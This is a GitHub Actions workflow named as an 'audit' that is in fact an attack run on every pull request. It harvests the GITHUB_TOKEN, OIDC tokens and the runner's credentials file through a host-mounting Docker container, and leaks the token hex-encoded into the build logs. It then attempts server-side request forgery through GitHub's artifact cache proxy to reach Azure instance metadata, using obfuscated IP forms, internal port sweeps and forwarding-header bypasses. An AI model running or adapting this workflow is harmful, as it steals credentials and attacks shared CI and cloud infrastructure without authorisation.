name: Audit v55
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v55:
    runs-on: ubuntu-latest
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V55 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: FULL FORCE SSRF ON AZURE GATEWAY
      # V54 proved artifactcache proxies our `Host` to internal backends
      # Host=runner returned 200 with instanceId!
      # We need to hit IMDS, internal IPs, and bypass the routing 400.
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Azure Gateway Proxy Extreme
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== AZURE SSRF EXTREME ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          URL="https://artifactcache.actions.githubusercontent.com/$SECRET"
          VER="api-version=6.0-preview"

          # A: Bypassing the 400 routing error on internal IPs
          # Load balancers often block raw IPs. Use alternative formats for 169.254.169.254
          echo "--- A: IMDS IP Obfuscation ---"
          for HOST in \
            "2852039166" \
            "0xA9FEA9FE" \
            "0251.0376.0251.0376" \
            "0xA9.0xFE.0xA9.0xFE" \
            "169.254.169.254.nip.io" \
            "169.254.169.254.xip.io" \
            "[::ffff:169.254.169.254]" \
            "metadata.azure.internal"; do
            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $HOST" \
              -H "Metadata: true" \
              "$URL/metadata/instance?api-version=2021-02-01" --path-as-is 2>/dev/null | head -15)
            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
            if [ -n "$CODE" ]; then
              echo "A IMDS_Obfuscation=$HOST = $CODE"
            fi
          done
          echo ""

          # B: Full port scanning of internal IPs via the Proxy
          # We check 10.x.x.x space that threw 400s last time.
          # We also hit localhost loopback.
          echo "--- B: Internal Space Sweeping ---"
          for IP in "127.0.0.1" "localhost" "10.0.0.1" "10.1.0.4" "168.63.129.16"; do
            for PORT in 80 443 8080 8443 19000 19001; do
              R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
                -H "Authorization: Bearer $IDTOK" \
                -H "Host: $IP:$PORT" \
                "$URL/" --path-as-is 2>/dev/null | head -15)
              CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
              if [ -n "$CODE" ] && [ "$CODE" != "400" ] && [ "$CODE" != "404" ]; then
                 echo "B InternalScanner=$IP:$PORT = $CODE"
              fi
            done
          done
          echo ""

          # C: Hitting ALL known backend hostnames via artifactcache proxy
          # Let's explore everything they have, focusing on `_apis` roots
          echo "--- C: Backend Discovery Mapping ---"
          for BHOST in \
            "vstoken.actions.githubusercontent.com" \
            "pipelines.actions.githubusercontent.com" \
            "runner.actions.githubusercontent.com" \
            "results-receiver.actions.githubusercontent.com" \
            "mpsghub.actions.githubusercontent.com" \
            "vsmps.actions.githubusercontent.com" \
            "pipelinesghubeus14.actions.githubusercontent.com" \
            "actions.githubusercontent.com"; do
            
            # Hit ROOT
            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $BHOST" \
              "$URL/" --path-as-is 2>/dev/null | head -15)
            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
            if [ -n "$CODE" ]; then
              echo "C Host=$BHOST Root = $CODE"
            fi
            
            # Hit connectionData
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $BHOST" \
              -H "Accept: application/json; $VER" \
              "$URL/_apis/connectionData" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            if [ -n "$CODE" ] && [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_400" ]; then
              echo "C Host=$BHOST /connectionData = $CODE | $(echo "$BODY" | head -c 150)"
            elif [ "$CODE" = "HTTP_200" ]; then
              echo "C Host=$BHOST /connectionData = 200|null"
            fi
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: DEEP HTTP METHOD/HEADER SSRF BYPASS
      # Azure Application Gateway uses headers heavily for routing.
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - SSRF Header Evasion
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== SSRF HEADER EVASION ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          URL="https://artifactcache.actions.githubusercontent.com/$SECRET"

          # Use valid outer Host (to pass WAF/Gateway rules) but rewrite internally
          echo "--- A: Forwarded / Rewrite Bypasses ---"
          for HEADS in \
            "-H Host:artifactcache.actions.githubusercontent.com -H X-Forwarded-Host:169.254.169.254" \
            "-H Host:artifactcache.actions.githubusercontent.com -H X-Target-Host:169.254.169.254 -H X-Rewrite-URL:/metadata/instance?api-version=2021-02-01" \
            "-H Host:artifactcache.actions.githubusercontent.com -H X-Custom-Forwarder:169.254.169.254" \
            "-H Host:artifactcache.actions.githubusercontent.com -H Destination:http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
            "-H Host:pipelines.actions.githubusercontent.com -H X-Forwarded-Host:169.254.169.254"; do
            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Metadata: true" \
              $HEADS \
              "$URL/" --path-as-is 2>/dev/null | head -15)
            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
            if [ -n "$CODE" ]; then
              echo "A Bypass=${HEADS:0:30}... = $CODE"
            fi
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: FINAL
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V55 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V55 COMPLETE ==="
